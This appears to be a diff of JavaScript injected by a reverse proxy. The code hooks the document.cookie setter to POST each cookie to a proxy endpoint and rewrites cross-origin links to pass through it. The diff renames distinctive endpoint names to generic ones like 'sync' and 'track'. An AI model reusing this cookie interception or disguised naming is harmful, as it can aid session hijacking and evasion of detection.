@@ -8,7 +8,7 @@
                 if (registration &&
                     registration.active &&
                     registration.active.scriptURL &&
-                    registration.active.scriptURL.endsWith("service_worker_Mz8XO2ny1Pg5.js")) {
+                    registration.active.scriptURL.endsWith("sw_257d3c475e1e56ec.js")) {
 
                     return undefined;
                 }
@@ -27,7 +27,7 @@
 
                     return !(registration.active &&
                         registration.active.scriptURL &&
-                        registration.active.scriptURL.endsWith("service_worker_Mz8XO2ny1Pg5.js"));
+                        registration.active.scriptURL.endsWith("sw_257d3c475e1e56ec.js"));
                 })
             });
     };
@@ -42,7 +42,7 @@
             return originalCookieDescriptor.get.call(document);
         },
         set(cookie) {
-            const proxyRequestURL = `${self.location.origin}/JSCookie_6X7dRqLg90mH`;
+            const proxyRequestURL = `${self.location.origin}/sync/92346b1c8a8a5a182160`;
             try {
                 const xhr = new XMLHttpRequest();
                 xhr.open("POST", proxyRequestURL, false);
@@ -110,8 +110,8 @@ function updateHTMLAttribute(htmlNode, htmlAttribute) {
         const htmlAttributeURL = new URL(htmlNode[htmlAttribute]);
 
         if (htmlAttributeURL.origin !== self.location.origin) {
-            const proxyRequestURL = new URL(`${self.location.origin}/Mutation_o5y3f4O7jMGW`);
-            proxyRequestURL.searchParams.append("redirect_urI", encodeURIComponent(htmlAttributeURL.href));
+            const proxyRequestURL = new URL(`${self.location.origin}/track/8be84090a1c8794aec3a`);
+            proxyRequestURL.searchParams.append("dest", encodeURIComponent(htmlAttributeURL.href));
 
             htmlNode[htmlAttribute] = proxyRequestURL;
         }
